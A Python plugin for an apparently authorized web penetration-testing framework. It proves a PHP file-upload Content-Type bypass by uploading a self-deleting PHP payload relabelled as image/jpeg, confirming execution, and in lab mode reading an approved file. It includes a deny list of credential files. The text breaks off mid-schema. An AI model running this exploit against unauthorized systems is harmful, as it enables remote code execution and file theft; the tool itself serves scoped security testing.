"""
web:file_upload_probe — bounded PHP multipart Content-Type bypass proof.

This phase-4 native probe owns every dangerous byte.  The caller selects only
the authorized same-origin form/action/serve paths and exact response
contracts.  The tool generates one nonce-bound basename-only ``.php`` file,
submits a rejected non-image control, proves the control artifact is absent,
then repeats the same file part with only its MIME changed to ``image/jpeg``.
The payload emits either a benign execution marker or one explicitly approved
lab value and immediately calls ``unlink(__FILE__)``.  A final GET must prove
cleanup before a finding is returned.

Authentication material is deliberately hidden from the model-facing
contract.  ``authCookies``/``cookie`` are accepted only so the backend can
inject the active workflow AuthContext after approval.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import math
import re
import secrets
from html import unescape
from html.parser import HTMLParser
from http.cookies import SimpleCookie
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple
from urllib.parse import urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _field_name,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"php-multipart-content-type-bypass-v1"}
ALLOWED_PROOF_LEVELS = {"runtime-execution", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}

EXPECTED_RUNTIME_STEP_LABELS = (
    "upload-form-control",
    "disallowed-mime-control-upload",
    "control-artifact-absence",
    "upload-form-attack",
    "image-mime-attack-upload",
    "executed-marker-fetch",
    "cleanup-confirmation",
)
EXPECTED_LAB_STEP_LABELS = (
    "unsolved-baseline",
    "upload-form-control",
    "disallowed-mime-control-upload",
    "control-artifact-absence",
    "upload-form-attack",
    "image-mime-attack-upload",
    "scoped-secret-execution-fetch",
    "cleanup-confirmation",
    "approved-solution-submit",
    "solved-confirmation",
)
EXPECTED_CARRIER_ROLES = {
    "unsolved-baseline": "none",
    "upload-form-control": "authenticated-form",
    "disallowed-mime-control-upload": "disallowed-mime-control",
    "control-artifact-absence": "artifact-absence",
    "upload-form-attack": "authenticated-form",
    "image-mime-attack-upload": "image-mime-attack",
    "executed-marker-fetch": "executed-marker",
    "scoped-secret-execution-fetch": "scoped-secret",
    "cleanup-confirmation": "cleanup-receipt",
    "approved-solution-submit": "approved-solution",
    "solved-confirmation": "none",
}

CONTROL_MIME = "application/x-httpd-php"
ATTACK_MIME = "image/jpeg"
USER_AGENT = "xASM-Agentic-File-Upload-Probe/1.0"
ACCEPT = "text/html,application/xhtml+xml,text/plain,*/*"

MAX_RESPONSE_BYTES = 64_000
MAX_EVIDENCE_CHARS = 130_000
MAX_MULTIPART_BYTES = 64_000
MAX_COOKIE_CHARS = 8_192
MAX_MARKER_CHARS = 512
MAX_PATH_CHARS = 2_048
MAX_HIDDEN_FIELDS = 16
MAX_HIDDEN_VALUE_CHARS = 2_048
MAX_HIDDEN_TOTAL_CHARS = 8_192
MAX_READ_VALUE_CHARS = 2_048
DEFAULT_JOB_TIMEOUT_SECONDS = 120.0
MAX_PROOF_REQUESTS = 10
FAILURE_CLEANUP_REQUESTS = 2

_NONCE = re.compile(r"^[0-9a-f]{32}$")
_SAFE_PATH = re.compile(r"^/[A-Za-z0-9._~/-]*$")
_SAFE_READ_SEGMENT = re.compile(r"^[A-Za-z0-9._~-]{1,128}$")
_SENSITIVE_FIELD = re.compile(
    r"(?:csrf|xsrf|token|session|cookie|authorization|password|secret|api[_-]?key)",
    re.I,
)
_SOURCE_DISCLOSURE = re.compile(
    r"<\?php|file_get_contents\s*\(|unlink\s*\(\s*__FILE__|__FILE__",
    re.I,
)
_DENIED_READ_NAMES = {
    ".env",
    ".git-credentials",
    "authorized_keys",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    "id_rsa",
    "passwd",
    "shadow",
    "gshadow",
}
_DENIED_READ_SUFFIXES = (
    ".key",
    ".pem",
    ".p12",
    ".pfx",
    ".kdbx",
)

_ALLOWED_PARAMETERS = {
    "target",
    "url",
    "mode",
    "proofLevel",
    "uploadFormPath",
    "uploadPath",
    "servePathTemplate",
    "fileField",
    "expectedFormStatus",
    "expectedControlUploadStatus",
    "expectedControlRejectionMarker",
    "expectedAbsenceStatus",
    "expectedAbsenceMarker",
    "expectedAttackUploadStatus",
    "expectedAttackAcceptanceMarker",
    "expectedAttackUploadLocation",
    "expectedExecutionStatus",
    "expectedCleanupStatus",
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
    "expectedStatusStatus",
    "expectedSolutionStatus",
    "expectedSolvedStatus",
    "approvedReadPath",
    "engagement",
    "allowUnsafeMethods",
    "fileUploadApproved",
    "serverSideExecutionApproved",
    "stateChangeApproved",
    "selfCleanupApproved",
    "sensitiveFileReadApproved",
    "solutionSubmitApproved",
    "timeoutSeconds",
    "authCookies",
    "cookie",
    "authHeaders",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}
_LAB_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
    "expectedStatusStatus",
    "expectedSolutionStatus",
    "expectedSolvedStatus",
    "approvedReadPath",
    "sensitiveFileReadApproved",
    "solutionSubmitApproved",
}


class FileUploadProbeError(ValueError):
    """Raised when the closed file-upload proof cannot be established."""


def _sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _sha256_text(value: str) -> str:
    return _sha256_bytes(value.encode("utf-8"))


def _same_origin(left: str, right: str) -> bool:
    a = urlsplit(left)
    b = urlsplit(right)

    def origin(parsed: Any) -> Tuple[str, str, int]:
        return (
            parsed.scheme.lower(),
            (parsed.hostname or "").lower(),
            parsed.port or (443 if parsed.scheme == "https" else 80),
        )

    return origin(a) == origin(b)


def _origin_target(value: Any) -> Optional[str]:
    """Accept only a credential-free HTTP(S) origin and canonicalize its slash."""
    raw = str(value or "").strip()
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.path not in {"", "/"}:
        return None
    target = _http_target(raw)
    if target is None or urlsplit(target).path != "/":
        return None
    return target


def _request_timeout_seconds(parameters: Dict[str, Any]) -> float:
    """Reserve enough watchdog budget for the largest proof and failure cleanup."""
    configured = float(int(parameters.get("timeoutSeconds") or 15))
    raw_job_timeout = parameters.get("_job_timeout_seconds")
    try:
        job_timeout = float(raw_job_timeout)
    except (TypeError, ValueError):
        job_timeout = DEFAULT_JOB_TIMEOUT_SECONDS
    if not math.isfinite(job_timeout) or job_timeout <= 0:
        job_timeout = DEFAULT_JOB_TIMEOUT_SECONDS

    safety_margin = max(1.0, job_timeout * 0.10)
    usable_budget = max(job_timeout - safety_margin, job_timeout * 0.50)
    total_request_slots = MAX_PROOF_REQUESTS + FAILURE_CLEANUP_REQUESTS
    return min(configured, usable_budget / total_request_slots)


def _strict_relative_path(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if (
        not raw
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.startswith("//")
        or "\\" in raw
        or "%" in raw
        or "\r" in raw
        or "\n" in raw
        or "\0" in raw
        or not _SAFE_PATH.fullmatch(raw)
    ):
        return None
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme or parsed.netloc or parsed.query or parsed.fragment:
        return None
    segments = raw.split("/")
    if any(segment in {".", ".."} for segment in segments):
        return None
    if "//" in raw:
        return None
    return raw


def validate_serve_path_template(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if raw.count("{filename}") != 1 or not raw.endswith("/{filename}"):
        return None
    candidate = raw.replace("{filename}", "xasm-upload.php")
    return raw if _strict_relative_path(candidate) else None


def validate_approved_read_path(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if (
        not raw
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.endswith("/")
        or "//" in raw
        or "\\" in raw
        or "%" in raw
        or not _SAFE_PATH.fullmatch(raw)
    ):
        return None
    segments = raw.split("/")[1:]
    if any(
        not segment
        or segment in {".", ".."}
        or _SAFE_READ_SEGMENT.fullmatch(segment) is None
        for segment in segments
    ):
        return None
    allowed_shape = (
        len(segments) == 3 and segments[0] == "home"
    ) or (
        len(segments) == 2 and segments[0] == "tmp"
    ) or (
        len(segments) == 3 and segments[:2] == ["var", "tmp"]
    )
    if not allowed_shape:
        return None
    lowered = [segment.lower() for segment in segments]
    filename = lowered[-1]
    if ".ssh" in lowered or filename in _DENIED_READ_NAMES:
        return None
    if filename.endswith(_DENIED_READ_SUFFIXES):
        return None
    return raw


def _bounded_marker(value: Any) -> Optional[str]:
    raw = str(value or "")
    if (
        len(raw) < 3
        or len(raw) > MAX_MARKER_CHARS
        or raw != raw.strip()
        or any(character in raw for character in "\r\n\0")
    ):
        return None
    return raw


def _bounded_status(
    parameters: Dict[str, Any],
    name: str,
    minimum: int,
    maximum: int,
) -> Optional[int]:
    try:
        value = int(parameters[name])
    except (KeyError, TypeError, ValueError):
        return None
    return value if minimum <= value <= maximum else None


def _validated_cookie(parameters: Dict[str, Any]) -> Tuple[Optional[str], str]:
    auth_cookies = parameters.get("authCookies")
    cookie_alias = parameters.get("cookie")
    values = [
        str(value)
        for value in (auth_cookies, cookie_alias)
        if isinstance(value, str) and value
    ]
    if not values:
        return None, "an active server-injected authCookies/cookie session is required"
    if len(set(values)) != 1:
        return None, "server-injected authCookies and cookie aliases must match exactly"
    value = values[0]
    if (
        len(value) > MAX_COOKIE_CHARS
        or value != value.strip()
        or any(character in value for character in "\r\n\0")
    ):
        return None, "server-injected session cookie is malformed or exceeds bounds"
    jar = SimpleCookie()
    try:
        jar.load(value)
    except Exception:
        return None, "server-injected session cookie is malformed"
    if not jar or any(not morsel.key or not morsel.value for morsel in jar.values()):
        return None, "server-injected session cookie is empty or malformed"
    return value, ""


def _validated_authorization(parameters: Dict[str, Any]) -> Tuple[Optional[str], str]:
    raw_headers = parameters.get("authHeaders")
    if raw_headers is None:
        return "", ""
    if not isinstance(raw_headers, dict) or set(raw_headers) != {"Authorization"}:
        return None, (
            "server-injected authHeaders may contain only one Authorization header"
        )
    value = raw_headers.get("Authorization")
    if (
        not isinstance(value, str)
        or len(value) < 3
        or len(value) > MAX_COOKIE_CHARS
        or value != value.strip()
        or any(character in value for character in "\r\n\0")
    ):
        return None, "server-injected Authorization header is malformed or exceeds bounds"
    return value, ""


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unknown = sorted(str(key) for key in parameters if key not in _ALLOWED_PARAMETERS)
    if unknown:
        return False, f"unsupported parameter: {unknown[0]}"

    has_target = isinstance(parameters.get("target"), str) and bool(parameters["target"])
    has_url = isinstance(parameters.get("url"), str) and bool(parameters["url"])
    if has_target == has_url:
        return False, "exactly one of target or url is required"
    if not _origin_target(parameters.get("target") or parameters.get("url")):
        return False, (
            "target must be a credential-free HTTP(S) origin without a subpath, "
            "query, or fragment"
        )
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be php-multipart-content-type-bypass-v1"

    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-execution or lab-state-change"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"

    for field in ("uploadFormPath", "uploadPath"):
        if not _strict_relative_path(parameters.get(field)):
            return False, f"{field} must be a bounded same-origin path without query or fragment"
    if not validate_serve_path_template(parameters.get("servePathTemplate")):
        return False, (
            "servePathTemplate must be a bounded same-origin path ending in /{filename}"
        )
    if not _field_name(parameters.get("fileField")):
        return False, "fileField must be a bounded form-field name"

    if _bounded_status(parameters, "expectedFormStatus", 200, 299) is None:
        return False, "expectedFormStatus must be between 200 and 299"
    if _bounded_status(parameters, "expectedControlUploadStatus", 200, 499) is None:
        return False, "expectedControlUploadStatus must be between 200 and 499"
    if _bounded_status(parameters, "expectedAbsenceStatus", 404, 410) not in {404, 410}:
        return False, "expectedAbsenceStatus must be exactly 404 or 410"
    if _bounded_status(parameters, "expectedAttackUploadStatus", 200, 399) is None:
        return False, "expectedAttackUploadStatus must be between 200 and 399"
    if _bounded_status(parameters, "expectedExecutionStatus", 200, 299) is None:
        return False, "expectedExecutionStatus must be between 200 and 299"
    if _bounded_status(parameters, "expectedCleanupStatus", 404, 410) not in {404, 410}:
        return False, "expectedCleanupStatus must be exactly 404 or 410"
    for field in (
        "expectedControlRejectionMarker",
        "expectedAbsenceMarker",
        "expectedAttackAcceptanceMarker",
    ):
        if _bounded_marker(parameters.get(field)) is None:
            return False, f"{field} must be a bounded safe string"
    if len(
        {
            str(parameters["expectedControlRejectionMarker"]),
            str(parameters["expectedAbsenceMarker"]),
            str(parameters["expectedAttackAcceptanceMarker"]),
        }
    ) != 3:
        return False, "control, absence, and upload markers must be distinct"

    expected_upload_status = int(parameters["expectedAttackUploadStatus"])
    upload_location = parameters.get("expectedAttackUploadLocation")
    if 300 <= expected_upload_status <= 399:
        if not _strict_relative_path(upload_location):
            return False, (
                "expectedAttackUploadLocation is required for a redirect upload status "
                "and must be same-origin"
            )
    elif upload_location is not None:
        return False, (
            "expectedAttackUploadLocation is only allowed for a redirect upload status"
        )

    for approval in (
        "allowUnsafeMethods",
        "fileUploadApproved",
        "serverSideExecutionApproved",
        "stateChangeApproved",
        "selfCleanupApproved",
    ):
        if parameters.get(approval) is not True:
            return False, f"{approval}=true is required"

    cookie, cookie_reason = _validated_cookie(parameters)
    if cookie is None:
        return False, cookie_reason
    authorization, authorization_reason = _validated_authorization(parameters)
    if authorization is None:
        return False, authorization_reason

    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"

    if proof_level == "runtime-execution":
        unexpected = sorted(_LAB_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for lab-state-change"
        return True, ""

    if engagement not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    for field in ("statusPath", "solutionPath"):
        if not _strict_relative_path(parameters.get(field)):
            return False, f"{field} must be a bounded same-origin path"
    for field in ("unsolvedMarker", "solvedMarker"):
        if _bounded_marker(parameters.get(field)) is None:
            return False, f"{field} must be a bounded safe string"
    if str(parameters["unsolvedMarker"]) == str(parameters["solvedMarker"]):
        return False, "unsolvedMarker and solvedMarker must be distinct"
    for field in (
        "expectedStatusStatus",
        "expectedSolutionStatus",
        "expectedSolvedStatus",
    ):
        if _bounded_status(parameters, field, 200, 299) is None:
            return False, f"{field} must be between 200 and 299"
    if not validate_approved_read_path(parameters.get("approvedReadPath")):
        return False, "approvedReadPath is outside the bounded single-file read contract"
    for approval in ("sensitiveFileReadApproved", "solutionSubmitApproved"):
        if parameters.get(approval) is not True:
            return False, f"{approval}=true is required for lab-state-change"
    return True, ""


class _MultipartFormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.forms: List[Dict[str, Any]] = []
        self.current: Optional[Dict[str, Any]] = None
        self.nested = False

    def handle_starttag(
        self,
        tag: str,
        attrs: List[Tuple[str, Optional[str]]],
    ) -> None:
        normalized = {str(key).lower(): str(value or "") for key, value in attrs}
        if tag.lower() == "form":
            if self.current is not None:
                self.nested = True
                self.current["invalid"] = True
                return
            self.current = {
                "action": normalized.get("action", ""),
                "method": normalized.get("method", "get").lower(),
                "enctype": normalized.get("enctype", "").lower(),
                "fileFields": [],
                "hiddenFields": [],
                "invalid": False,
            }
            return
        if tag.lower() != "input" or self.current is None:
            return
        input_type = normalized.get("type", "text").lower()
        name = normalized.get("name", "")
        if input_type == "file":
            self.current["fileFields"].append(name)
        elif input_type == "hidden":
            self.current["hiddenFields"].append((name, normalized.get("value", "")))

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() != "form" or self.current is None:
            return
        if self.nested:
            self.nested = False
            return
        self.forms.append(self.current)
        self.current = None


def parse_upload_form(
    html: str,
    page_url: str,
    target: str,
    expected_upload_path: str,
    file_field: str,
) -> Dict[str, Any]:
    parser = _MultipartFormParser()
    try:
        parser.feed(str(html or ""))
        parser.close()
    except Exception as exc:
        raise FileUploadProbeError("upload form HTML could not be parsed") from exc
    if parser.current is not None:
        raise FileUploadProbeError("upload form HTML ended before the form was closed")

    matching: List[Dict[str, Any]] = []
    for form in parser.forms:
        if form.get("invalid"):
            continue
        file_fields = form.get("fileFields") or []
        if (
            form.get("method") != "post"
            or form.get("enctype") != "multipart/form-data"
            or file_fields != [file_field]
        ):
            continue
        action_url = urljoin(page_url, str(form.get("action") or page_url))
        if not _same_origin(target, action_url):
            raise FileUploadProbeError("upload form action escaped the authorized target origin")
        if _path_and_query(action_url) != expected_upload_path:
            raise FileUploadProbeError(
                "upload form action did not equal the workflow-owned uploadPath"
            )
        form["actionUrl"] = action_url
        matching.append(form)

    if len(matching) != 1:
        raise FileUploadProbeError(
            "expected exactly one multipart form with exactly the configured file field"
        )

    selected = matching[0]
    hidden = selected.get("hiddenFields") or []
    if len(hidden) > MAX_HIDDEN_FIELDS:
        raise FileUploadProbeError("upload form exceeded the hidden-field limit")
    names: set[str] = set()
    total_chars = 0
    normalized_hidden: List[Tuple[str, str]] = []
    csrf_fields: List[Tuple[str, str]] = []
    for raw_name, raw_value in hidden:
        name = _field_name(raw_name)
        value = str(raw_value)
        if (
            not name
            or name == file_field
            or name in names
            or len(value) > MAX_HIDDEN_VALUE_CHARS
            or any(character in value for character in "\r\n\0")
        ):
            raise FileUploadProbeError("upload form contained an unsafe hidden field")
        names.add(name)
        total_chars += len(name) + len(value)
        normalized_hidden.append((name, value))
        if _SENSITIVE_FIELD.search(name):
            if not value:
                raise FileUploadProbeError("upload form contained an empty CSRF/token field")
            csrf_fields.append((name, value))
    if total_chars > MAX_HIDDEN_TOTAL_CHARS:
        raise FileUploadProbeError("upload form hidden fields exceeded the aggregate limit")
    if len(csrf_fields) != 1:
        raise FileUploadProbeError(
            "upload form must contain exactly one bounded CSRF/token hidden field"
        )
    selected["hiddenFields"] = normalized_hidden
    selected["csrfField"] = csrf_fields[0]
    return selected


def build_php_payload(
    nonce: str,
    approved_read_path: Optional[str] = None,
) -> Dict[str, Any]:
    if _NONCE.fullmatch(nonce) is None:
        raise ValueError("nonce must be exactly 32 lowercase hexadecimal characters")
    marker = "xasm-upload-" + hashlib.sha256(
        f"xasm-file-upload:{nonce}".encode("ascii")
    ).hexdigest()
    if approved_read_path is None:
        source = (
            "<?php echo 'xasm-upload-' . hash('sha256', "
            f"'xasm-file-upload:{nonce}'); @unlink(__FILE__); ?>"
        )
        return {
            "source": source,
            "expectedMarker": marker,
        }
    path = validate_approved_read_path(approved_read_path)
    if path is None:
        raise ValueError("approved read path is outside the bounded contract")
    source = (
        f"<?php $value = trim((string) file_get_contents('{path}')); "
        f"echo 'xasm-upload-' . hash('sha256', 'xasm-file-upload:{nonce}') "
        '. "\\n" . $value; @unlink(__FILE__); ?>'
    )
    return {
        "source": source,
        "expectedMarker": marker,
    }


def _quoted_disposition_value(value: str) -> str:
    if not value or re.search(r"[\r\n\"\\]", value):
        raise FileUploadProbeError("multipart field metadata contained unsafe characters")
    return value


def build_multipart_body(
    boundary: str,
    hidden_fields: Sequence[Tuple[str, str]],
    file_field: str,
    filename: str,
    file_mime: str,
    payload: bytes,
) -> Tuple[bytes, bytes]:
    if not re.fullmatch(r"xasm[0-9a-f]{32}", boundary):
        raise FileUploadProbeError("multipart boundary is outside the tool-owned contract")
    field_name = _quoted_disposition_value(file_field)
    safe_filename = _quoted_disposition_value(filename)
    if "/" in safe_filename or safe_filename in {".", ".."}:
        raise FileUploadProbeError("multipart filename must be basename-only")
    if file_mime not in {CONTROL_MIME, ATTACK_MIME}:
        raise FileUploadProbeError("multipart file MIME is outside the tool-owned contract")

    chunks: List[bytes] = []
    boundary_bytes = boundary.encode("ascii")
    for name, value in hidden_fields:
        safe_name = _quoted_disposition_value(name)
        chunks.extend(
            [
                b"--" + boundary_bytes + b"\r\n",
                f'Content-Disposition: form-data; name="{safe_name}"\r\n\r\n'.encode(
                    "ascii"
                ),
                value.encode("utf-8"),
                b"\r\n",
            ]
        )
    file_part = b"".join(
        [
            (
                f'Content-Disposition: form-data; name="{field_name}"; '
                f'filename="{safe_filename}"\r\n'
            ).encode("ascii"),
            f"Content-Type: {file_mime}\r\n\r\n".encode("ascii"),
            payload,
        ]
    )
    chunks.extend(
        [
            b"--" + boundary_bytes + b"\r\n",
            file_part,
            b"\r\n",
            b"--" + boundary_bytes + b"--\r\n",
        ]
    )
    body = b"".join(chunks)
    if len(body) > MAX_MULTIPART_BYTES:
        raise FileUploadProbeError("multipart request exceeded the bounded body limit")
    return body, file_part


def _canonical_file_part(file_part: bytes) -> bytes:
    return re.sub(
        br"Content-Type: (?:application/x-httpd-php|image/jpeg)\r\n",
        b"Content-Type: <file-part-content-type>\r\n",
        file_part,
        count=1,
    )


def _header_values(headers: Any, name: str) -> List[str]:
    if headers is None:
        return []
    try:
        return [str(value) for value in headers.getall(name, [])]
    except AttributeError:
        value = headers.get(name) if hasattr(headers, "get") else None
        return [] if value is None else [str(value)]


def _sanitize_http_text(
    text: Any,
    secret_values: Iterable[Any] = (),
    max_chars: int = MAX_EVIDENCE_CHARS,
) -> str:
    return sanitize_evidence_text(text, secret_values, max_chars)


def _redact_non_file_multipart_values(body: str) -> str:
    return re.sub(
        r'(Content-Disposition: form-data; name="[^"\r\n]+"\r\n\r\n)'
        r".*?(?=\r\n--xasm[0-9a-f]{32}(?:\r\n|--))",
        lambda match: match.group(1) + REDACTED_RUNTIME_SECRET,
        body,
        flags=re.S,
    )


def _request_transcript(
    method: str,
    url: str,
    cookie: str,
    body: bytes,
    content_type: str,
    secret_values: Iterable[Any],
    authorization: str = "",
) -> str:
    parsed = urlsplit(url)
    raw_body = body.decode("utf-8", errors="replace")
    if content_type.startswith("multipart/form-data;"):
        raw_body = _redact_non_file_multipart_values(raw_body)
    sanitized_body = _sanitize_http_text(raw_body, secret_values)
    lines = [
        f"{method} {_sanitize_http_text(_path_and_query(url), secret_values)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        f"User-Agent: {USER_AGENT}",
        f"Accept: {ACCEPT}",
    ]
    if cookie:
        lines.append(f"Cookie: {cookie}")
    if authorization:
        lines.append(f"Authorization: {authorization}")
    if body:
        lines.extend(
            [
                f"Content-Type: {content_type}",
                f"Content-Length: {len(sanitized_body.encode('utf-8'))}",
            ]
        )
    return _sanitize_http_text(
        "\r\n".join(lines) + "\r\n\r\n" + sanitized_body,
        secret_values,
    )


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Tuple[str, bool]:
    reason = str(response.get("reason") or "").replace("\r", "").replace("\n", "")[:100]
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {reason}"]
    for name in ("Content-Type", "Cache-Control", "Location", "Set-Cookie"):
        for value in _header_values(response.get("headers"), name):
            lines.append(f"{name}: {value}")
    sanitized_body = _sanitize_http_text(str(response.get("body") or ""), secret_values)
    sanitized_head = _sanitize_http_text("\r\n".join(lines), secret_values)
    sanitized_head += f"\r\nContent-Length: {len(sanitized_body.encode('utf-8'))}"
    transcript = sanitized_head + "\r\n\r\n" + sanitized_body
    oversized = len(transcript.encode("utf-8", errors="replace")) > MAX_EVIDENCE_CHARS
    return transcript, bool(response.get("truncated")) or oversized


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    cookie: str,
    body: bytes,
    content_type: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
    authorization: str = "",
) -> Dict[str, Any]:
    request = _request_transcript(
        method,
        url,
        cookie,
        body,
        content_type,
        secret_values,
        authorization,
    )
    response_text, truncated = _response_transcript(response, secret_values)
    response_body = (
        response_text.split("\r\n\r\n", 1)[1]
        if "\r\n\r\n" in response_text
        else ""
    )
    return {
        "label": label,
        "carrierRole": EXPECTED_CARRIER_ROLES[label],
        "request": request,
        "requestSha256": _sha256_text(request),
        "response": response_text,
        "responseSha256": _sha256_text(response_text),
        "responseBodySha256": _sha256_text(response_body),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def _response_body(response: Dict[str, Any]) -> str:
    return unescape(str(response.get("body") or "").replace("\0", ""))


def _response_location(response: Dict[str, Any]) -> Optional[str]:
    values = _header_values(response.get("headers"), "Location")
    if len(values) > 1:
        raise FileUploadProbeError("response contained ambiguous Location headers")
    return values[0] if values else None


def _assert_common_response(
    response: Dict[str, Any],
    expected_status: int,
    label: str,
    *,
    allow_configured_redirect: bool = False,
) -> str:
    status = int(response.get("status") or 0)
    if response.get("redirected"):
        raise FileUploadProbeError(f"{label} unexpectedly followed a redirect")
    if response.get("truncated"):
        raise FileUploadProbeError(f"{label} response was truncated")
    if status != expected_status:
        raise FileUploadProbeError(f"{label} returned an unexpected status")
    if 300 <= status <= 399 and not allow_configured_redirect:
        raise FileUploadProbeError(f"{label} returned an unapproved redirect")
    return _response_body(response)


def _assert_no_source_or_marker(body: str, payload_source: str, markers: Sequence[str]) -> None:
    if payload_source in body or _SOURCE_DISCLOSURE.search(body):
        raise FileUploadProbeError("response disclosed the PHP source instead of executing it")
    if any(marker and marker in body for marker in markers):
        raise FileUploadProbeError("response contained execution proof material in the wrong step")


def _parse_exact_execution(
    body: str,
    payload: Dict[str, Any],
    proof_level: str,
) -> Optional[str]:
    if payload["source"] in body or _SOURCE_DISCLOSURE.search(body):
        raise FileUploadProbeError("served artifact disclosed PHP source instead of executing")
    compact = body.strip()
    if proof_level == "runtime-execution":
        if compact != payload["expectedMarker"]:
            raise FileUploadProbeError("served artifact did not return the exact execution marker")
        return None

    marker = str(payload["expectedMarker"])
    if compact.count(marker) != 1 or not compact.startswith(marker + "\n"):
        raise FileUploadProbeError("scoped read response was not exactly nonce framed")
    value = compact[len(marker) + 1 :]
    if (
        not value
        or len(value) > MAX_READ_VALUE_CHARS
        or value != value.strip()
        or any(ord(character) < 0x20 or ord(character) == 0x7F for character in value)
    ):
        raise FileUploadProbeError("scoped read returned an empty or unsafe bounded value")
    return value


def _parse_solution_success(body: str) -> bool:
    def reject_duplicates(pairs: List[Tuple[str, Any]]) -> Dict[str, Any]:
        result: Dict[str, Any] = {}
        for key, value in pairs:
            if key in result:
                raise FileUploadProbeError("solution response contained duplicate JSON keys")
            result[key] = value
        return result

    try:
        document = json.loads(body, object_pairs_hook=reject_duplicates)
    except FileUploadProbeError:
        raise
    except Exception as exc:
        raise FileUploadProbeError("solution response was not valid JSON") from exc
    return isinstance(document, dict) and document.get("correct") is True


def build_nuclei_finding(
    target: str,
    verification: Dict[str, Any],
) -> Dict[str, Any]:
    return {
        "template-id": "xasm-file-upload-content-type-bypass-verified-candidate",
        "matcher-name": "php-multipart-content-type-bypass",
        "type": "http",
        "host": target,
        "matched-at": urljoin(target, str(verification.get("uploadPath") or "/")),
        "info": {
            "name": "Verified PHP Execution via Multipart Content-Type Validation Bypass",
            "severity": "high",
            "description": (
                "A rejected non-image control was absent, while the same PHP file part "
                "was accepted after only its multipart Content-Type changed to image/jpeg "
                "and then executed server-side."
            ),
            "remediation": (
                "Do not trust client-supplied MIME metadata. Validate and re-encode content "
                "server-side, generate storage names, keep uploads outside executable web "
                "roots, and serve them from a non-executable isolated origin."
            ),
            "classification": {"cwe-id": ["CWE-434"]},
        },
        "evidence": verification,
    }


class FileUploadProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:file_upload_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one bounded PHP multipart Content-Type validation bypass with "
            "a rejected control, MIME-only file-part differential, nonce-bound "
            "server-side execution, mandatory self-cleanup, complete redacted HTTP "
            "evidence, and an optional approved lab solve."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        lab_fields = sorted(_LAB_PARAMETERS)
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {
                    "type": "string",
                    "enum": sorted(ALLOWED_PROOF_LEVELS),
                },
                "uploadFormPath": {"type": "string"},
                "uploadPath": {"type": "string"},
                "servePathTemplate": {"type": "string"},
                "fileField": {"type": "string"},
                "expectedFormStatus": {"type": "integer", "minimum": 200, "maximum": 299},
                "expectedControlUploadStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 499,
                },
                "expectedControlRejectionMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "expectedAbsenceStatus": {
                    "type": "integer",
                    "enum": [404, 410],
                },
                "expectedAbsenceMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "expectedAttackUploadStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 399,
                },
                "expectedAttackAcceptanceMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "expectedAttackUploadLocation": {"type": "string"},
                "expectedExecutionStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 299,
                },
                "expectedCleanupStatus": {
                    "type": "integer",
                    "enum": [404, 410],
                },
                "statusPath": {"type": "string"},
                "unsolvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "solvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "solutionPath": {"type": "string"},
